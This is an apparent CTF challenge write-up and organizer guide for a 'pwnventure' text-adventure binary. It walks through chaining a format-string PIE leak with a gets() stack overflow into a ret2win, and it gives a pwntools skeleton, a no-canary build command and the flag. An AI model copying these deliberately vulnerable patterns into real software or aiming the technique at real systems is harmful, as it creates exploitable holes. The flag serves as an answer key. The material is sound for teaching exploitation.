@@ -1,0 +1,477 @@
+IITCTF - CHOOSE YOUR OWN PWNVENTURE
+=======================================
+
+Category: Pwn
+Difficulty: Hard
+
+Flag:
+IITCTF{ch00s3_w1s3ly_pwn3r}
+
+Author:
+Created by AribZobair
+
+
+CHALLENGE DESCRIPTION
+---------------------
+
+You wake up in a strange place.
+
+A sign says:
+
+    "Your choices have consequences."
+
+Explore the adventure, reach the treasure room, and unlock the vault.
+
+The program looks like a goofy text adventure, but two deliberately
+vulnerable input handlers are hidden inside it.
+
+The intended exploit combines:
+
+    - format-string information disclosure
+    - PIE base recovery
+    - stack-based buffer overflow
+    - ret2win / control-flow redirection
+
+
+INTENDED DIFFICULTY
+-------------------
+
+This challenge is intended to be harder than the Medium activation
+challenge.
+
+The narrative is deliberately easy to understand. The difficulty
+comes from identifying and chaining the vulnerabilities.
+
+
+1. EXPLORE THE PROGRAM
+----------------------
+
+Run:
+
+    ./pwnventure
+
+Choose:
+
+    [1] Start adventure
+
+Then choose either the Friendly or Suspicious path.
+
+The choices are intentionally lightweight. Both paths eventually
+lead to the castle.
+
+At the castle, choosing either option eventually leads to the
+Treasure Room. One convenient route is:
+
+    [1] Start adventure
+    [1] Friendly Path
+    [1] Enter the castle
+
+The other castle option visits the fortune teller first.
+
+You eventually reach:
+
+    THE TREASURE ROOM
+
+The terminal asks:
+
+    "SPEAK THE ANCIENT PASSWORD."
+
+This is the stack-overflow input point.
+
+
+2. CHECK BINARY PROTECTIONS
+---------------------------
+
+Run:
+
+    checksec --file=./pwnventure
+
+The intended build should have approximately:
+
+    Partial RELRO
+    No stack canary
+    NX enabled
+    PIE enabled
+
+Important observations:
+
+    No stack canary
+        -> stack overflow can overwrite saved RIP.
+
+    NX enabled
+        -> stack shellcode is not the intended technique.
+
+    PIE enabled
+        -> code addresses are randomized.
+
+Therefore an information leak is needed before using a runtime
+address from the binary.
+
+
+3. FIND THE FORMAT-STRING VULNERABILITY
+---------------------------------------
+
+The fortune teller asks for a name.
+
+Ghidra reveals:
+
+    printf("Your destiny says: ");
+    printf(name);
+
+The second call is unsafe.
+
+The safer version would be:
+
+    printf("%s", name);
+
+Because the player's input becomes the format string, an input such
+as:
+
+    %p %p %p %p
+
+can cause values from the process's argument/stack area to be
+interpreted as pointers and printed.
+
+
+4. FIND A USEFUL LEAK
+---------------------
+
+Experiment with positional format specifiers:
+
+    %1$p
+    %2$p
+    %3$p
+    %4$p
+    ...
+
+The exact position depends on the compiler and environment.
+
+The objective is to identify a leaked pointer belonging to the PIE
+binary.
+
+On a typical x86-64 Linux process, a PIE pointer may resemble:
+
+    0x55xxxxxxxxxx
+
+Do not hardcode an example address. Obtain the actual value from the
+running binary.
+
+
+5. CALCULATE THE PIE BASE
+-------------------------
+
+Use Ghidra or:
+
+    nm -n ./pwnventure
+
+to find static offsets of functions such as:
+
+    main
+    fortune_teller
+    treasure_room
+    win
+
+Once a leaked runtime address corresponding to a known PIE function
+has been identified:
+
+    PIE base =
+        leaked_runtime_address - known_static_offset
+
+Then calculate:
+
+    win_runtime =
+        PIE base + win_static_offset
+
+
+6. FIND THE STACK OVERFLOW
+--------------------------
+
+The treasure room contains:
+
+    char response[64];
+
+and:
+
+    gets(response);
+
+gets() performs no bounds checking.
+
+An input longer than the buffer can therefore overwrite stack data,
+including the saved return address.
+
+
+7. FIND THE RIP OFFSET
+----------------------
+
+Generate a cyclic pattern:
+
+    python3 -c 'from pwn import *; print(cyclic(200).decode())'
+
+Run the program under GDB, reach the treasure room, and provide the
+pattern.
+
+After the crash, inspect the overwritten instruction pointer or
+relevant stack value.
+
+Then calculate the offset:
+
+    cyclic_find(value)
+
+Determine the exact offset against the actual distributed binary.
+
+
+8. FIND win()
+-------------
+
+The binary contains a hidden function:
+
+    win()
+
+It is not called during normal execution.
+
+Find it with Ghidra or:
+
+    nm -n ./pwnventure | grep win
+
+The function prints:
+
+    IITCTF{ch00s3_w1s3ly_pwn3r}
+
+Because PIE is enabled, its static address is an offset within the
+binary rather than its final runtime address.
+
+Calculate:
+
+    runtime win address =
+        PIE base + win offset
+
+
+9. BUILD THE RET2WIN PAYLOAD
+----------------------------
+
+The intended final payload is conceptually:
+
+    payload = padding
+            + win_runtime
+
+On x86-64:
+
+    payload = b"A" * RIP_OFFSET
+    payload += p64(win_runtime)
+
+A pwntools exploit skeleton is:
+
+    from pwn import *
+
+    elf = ELF("./pwnventure")
+    p = process("./pwnventure")
+
+    # Start adventure.
+    p.sendlineafter(b"> ", b"1")
+
+    # Choose a path.
+    p.sendlineafter(b"> ", b"1")
+
+    # Enter the castle.
+    p.sendlineafter(b"> ", b"1")
+
+    # Send the final overflow payload.
+    p.sendlineafter(b"> ", payload)
+
+The complete exploit must first obtain the PIE leak and calculate
+win_runtime.
+
+
+10. WHY TWO BUGS ARE REQUIRED
+-----------------------------
+
+The two vulnerabilities serve different purposes.
+
+FORMAT STRING:
+
+    printf(name);
+
+Purpose:
+
+    INFORMATION DISCLOSURE
+
+It allows the player to obtain an address that helps defeat PIE.
+
+
+STACK OVERFLOW:
+
+    gets(response);
+
+Purpose:
+
+    CONTROL-FLOW HIJACKING
+
+It allows the player to overwrite the saved return address.
+
+
+The intended chain is:
+
+    Format string
+          |
+          v
+    PIE address leak
+          |
+          v
+    Calculate PIE base
+          |
+          v
+    Calculate win() runtime address
+          |
+          v
+    Stack buffer overflow
+          |
+          v
+    Overwrite saved RIP
+          |
+          v
+    Jump to win()
+          |
+          v
+    FLAG
+
+
+11. WHY A SIMPLE RET2WIN DOES NOT WORK
+---------------------------------------
+
+A player cannot simply use the static address of win().
+
+PIE means the executable is loaded at a randomized base address.
+
+Therefore:
+
+    static win address
+            !=
+    runtime win address
+
+The format-string vulnerability provides the information required
+to calculate the runtime address.
+
+
+12. GET THE FLAG
+----------------
+
+When the saved return address is successfully redirected to win():
+
+    win()
+
+prints:
+
+    IITCTF{ch00s3_w1s3ly_pwn3r}
+
+The success screen also credits:
+
+    Created by AribZobair
+
+
+QUICK SOLVE SUMMARY
+-------------------
+
+    Run binary
+        |
+        v
+    Explore the game
+        |
+        v
+    Reach fortune teller
+        |
+        v
+    Test format strings
+        |
+        v
+    Leak PIE address
+        |
+        v
+    Calculate PIE base
+        |
+        v
+    Find win() offset
+        |
+        v
+    Reach treasure room
+        |
+        v
+    Exploit gets()
+        |
+        v
+    Determine RIP offset
+        |
+        v
+    Build ret2win payload
+        |
+        v
+    Redirect RIP -> win()
+        |
+        v
+    IITCTF{ch00s3_w1s3ly_pwn3r}
+
+
+ORGANIZER BUILD
+---------------
+
+Build the intended Hard binary with:
+
+    gcc pwnventure.c -o pwnventure \
+        -O0 \
+        -fno-stack-protector \
+        -fPIE \
+        -pie \
+        -Wno-deprecated-declarations \
+        -Wno-implicit-function-declaration \
+        -D_GNU_SOURCE \
+        -Wl,--undefined=gets
+
+The binary is intended for Linux x86-64.
+
+The build intentionally has no stack canary, but keeps PIE and NX
+enabled.
+
+
+IMPORTANT TESTING
+-----------------
+
+Before deployment, verify against the exact binary that will be
+distributed:
+
+    1. The adventure reaches the fortune teller.
+    2. The format-string input is interpreted as a format string.
+    3. A reliable PIE pointer can be identified.
+    4. The PIE base calculation is correct.
+    5. win() has a stable static offset.
+    6. The treasure room contains the intended overflow.
+    7. The exact RIP offset is known.
+    8. The final ret2win payload works.
+    9. The flag is not exposed by an accidental normal execution path.
+
+
+DESIGN INTENT
+-------------
+
+The game choices are deliberately simple.
+
+They provide:
+
+    - narrative
+    - exploration
+    - humor
+    - misdirection
+    - a memorable route to the vulnerable functions
+
+They are NOT intended to be the main difficulty.
+
+The intended difficulty comes from:
+
+    information disclosure
+        +
+    PIE bypass
+        +
+    stack overflow
+        +
+    control-flow redirection
+
+The player should not need to guess an arbitrary long sequence of
+dialogue options to solve the challenge.
